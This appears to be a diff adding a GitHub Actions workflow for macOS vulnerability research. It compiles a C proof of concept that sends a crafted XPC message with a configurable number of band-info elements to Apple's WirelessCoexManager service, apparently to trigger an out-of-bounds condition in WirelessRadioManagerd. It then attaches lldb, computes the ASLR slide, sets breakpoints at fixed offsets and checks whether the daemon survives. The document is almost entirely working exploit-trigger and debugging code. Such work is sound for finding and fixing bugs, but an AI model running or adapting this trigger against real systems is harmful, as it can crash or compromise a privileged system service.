@@ -1,0 +1,153 @@
+name: wcm-bp
+on:
+  workflow_dispatch:
+
+jobs:
+  bp:
+    runs-on: macos-15
+    timeout-minutes: 14
+    steps:
+      - name: build poc
+        run: |
+          mkdir -p /tmp/w
+          cat > /tmp/w/poc.c <<'EOF'
+          #include <xpc/xpc.h>
+          #include <dispatch/dispatch.h>
+          #include <stdio.h>
+          #include <stdlib.h>
+          static const char *SVC = "com.apple.WirelessCoexManager";
+          static xpc_object_t send_sync(xpc_connection_t c, xpc_object_t msg, double t) {
+              dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+              __block xpc_object_t reply = NULL;
+              xpc_connection_send_message_with_reply(c, msg,
+                  dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0),
+                  ^(xpc_object_t r) { reply = xpc_retain(r); dispatch_semaphore_signal(sem); });
+              if (dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(t*NSEC_PER_SEC))) != 0) return NULL;
+              return reply;
+          }
+          int main(int argc, char **argv) {
+              int nelem = (argc > 1) ? atoi(argv[1]) : 40;
+              xpc_connection_t c = xpc_connection_create_mach_service(SVC,
+                  dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), 0);
+              if (!c) { printf("S1 create=0\n"); return 1; }
+              xpc_connection_set_event_handler(c, ^(xpc_object_t e) { (void)e; });
+              xpc_connection_resume(c);
+              xpc_object_t reg = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_uint64(reg, "kMessageId", 1);
+              xpc_object_t a1 = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_uint64(a1, "kWCMRegisterProcess_ProcessId", 3);
+              xpc_dictionary_set_value(reg, "kMessageArgs", a1);
+              xpc_object_t r2 = send_sync(c, reg, 3.0);
+              printf("S2 register_reply=%d\n", r2 != NULL);
+              if (r2) xpc_release(r2);
+              xpc_object_t arr = xpc_array_create(NULL, 0);
+              for (int i = 0; i < nelem; i++) {
+                  xpc_object_t e = xpc_dictionary_create(NULL, NULL, 0);
+                  xpc_dictionary_set_uint64(e, "kWCMCellularNetworkConfiguration_BandInfoSet_DirectionMask", 1);
+                  xpc_dictionary_set_int64(e, "kWCMCellularNetworkConfiguration_BandInfoSet_CenterFreq", 1000 + i);
+                  xpc_dictionary_set_double(e, "kWCMCellularNetworkConfiguration_BandInfoSet_Bandwidth", 10.0);
+                  xpc_array_append_value(arr, e);
+                  xpc_release(e);
+              }
+              xpc_object_t m4 = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_uint64(m4, "kMessageId", 2600);
+              xpc_object_t a4 = xpc_dictionary_create(NULL, NULL, 0);
+              xpc_dictionary_set_value(a4, "kWCMCellularNetworkConfiguration_BandInformationSet", arr);
+              xpc_dictionary_set_int64(a4, "kSubId", 0);
+              xpc_dictionary_set_value(m4, "kMessageArgs", a4);
+              printf("S4 sending %d elements...\n", nelem); fflush(stdout);
+              xpc_object_t r4 = send_sync(c, m4, 6.0);
+              printf("S4 oob_reply=%d\n", r4 != NULL);
+              if (r4) xpc_release(r4);
+              xpc_connection_cancel(c);
+              printf("DONE\n");
+              return 0;
+          }
+          EOF
+          clang -fblocks -O0 -o /tmp/w/poc /tmp/w/poc.c -framework Foundation
+          ls -la /tmp/w/poc
+        continue-on-error: true
+
+      - name: find slide and verify instruction pattern
+        run: |
+          set +e
+          PID=$(pgrep -x WirelessRadioManagerd | head -1)
+          echo "pid=$PID"
+          # 取主镜像的加载地址（第一行 WirelessRadioManagerd）
+          sudo lldb -b -p "$PID" -o "image list -o -f" -o "detach" -o "quit" 2>/dev/null \
+            | grep -i "WirelessRadioManagerd" | head -3 > /tmp/w/img.txt
+          cat /tmp/w/img.txt
+          LOAD=$(awk '{print $1}' /tmp/w/img.txt | head -1)
+          echo "LOAD=$LOAD"
+          python3 - "$LOAD" <<'PY'
+          import sys
+          load = int(sys.argv[1], 16)
+          filebase = 0x100000000
+          slide = load - filebase
+          print("slide = 0x%x" % slide)
+          for off in (0x1000445b0, 0x1000446e0, 0x1000446e4, 0x1000446e8, 0x1000446ec):
+              print("  target 0x%x -> runtime 0x%x" % (off, off + slide))
+          open('/tmp/w/slide.txt','w').write("0x%x" % slide)
+          PY
+          true
+        continue-on-error: true
+
+      - name: breakpoint test
+        run: |
+          set +e
+          PID=$(pgrep -x WirelessRadioManagerd | head -1)
+          SLIDE=$(cat /tmp/w/slide.txt 2>/dev/null)
+          echo "pid=$PID slide=$SLIDE"
+          if [ -z "$SLIDE" ]; then echo "NO SLIDE"; exit 0; fi
+          python3 - "$SLIDE" <<'PY' > /tmp/w/addr.txt
+          import sys
+          s = int(sys.argv[1], 16)
+          print("0x%x" % (0x1000446e4 + s))
+          print("0x%x" % (0x1000446e8 + s))
+          print("0x%x" % (0x1000446e0 + s))
+          PY
+          ADDR=$(head -1 /tmp/w/addr.txt)
+          echo "bp addr = $ADDR"
+          # 先确认该地址确实是指令边界并反汇编
+          sudo lldb -b -p "$PID" \
+            -o "disassemble -s $ADDR -c 6" \
+            -o "detach" -o "quit" 2>&1 | grep -A12 "disassemble" | head -20
+          echo "=== 设断点并等 PoC ==="
+          ( sudo lldb -b -p "$PID" \
+              -o "br s -a $ADDR" \
+              -o "continue" \
+              -o "register read w23 x8 x21" \
+              -o "bt 6" \
+              -o "detach" -o "quit" > /tmp/w/lldb.log 2>&1 ) &
+          LPID=$!
+          sleep 4
+          echo "--- running poc ---"
+          /tmp/w/poc 40
+          sleep 8
+          kill $LPID 2>/dev/null
+          echo "=== lldb output ==="
+          cat /tmp/w/lldb.log 2>/dev/null | tail -40
+          echo "=== daemon still alive? ==="
+          pgrep -x WirelessRadioManagerd
+          true
+        continue-on-error: true
+
+      - name: alternative - breakpoint on xpc handler entry
+        run: |
+          set +e
+          PID=$(pgrep -x WirelessRadioManagerd | head -1)
+          SLIDE=$(cat /tmp/w/slide.txt 2>/dev/null)
+          echo "pid=$PID slide=$SLIDE"
+          [ -z "$SLIDE" ] && exit 0
+          A1=$(python3 -c "print('0x%x'%(0x100044058+int('$SLIDE',16)))")
+          echo "handleNetworkConfig: @ $A1"
+          ( sudo lldb -b -p "$PID" -o "br s -a $A1" -o "continue" -o "bt 8" -o "detach" -o "quit" > /tmp/w/lldb2.log 2>&1 ) &
+          LPID=$!
+          sleep 4
+          /tmp/w/poc 40
+          sleep 8
+          kill $LPID 2>/dev/null
+          echo "=== lldb2 ==="
+          cat /tmp/w/lldb2.log 2>/dev/null | tail -30
+          true
+        continue-on-error: true
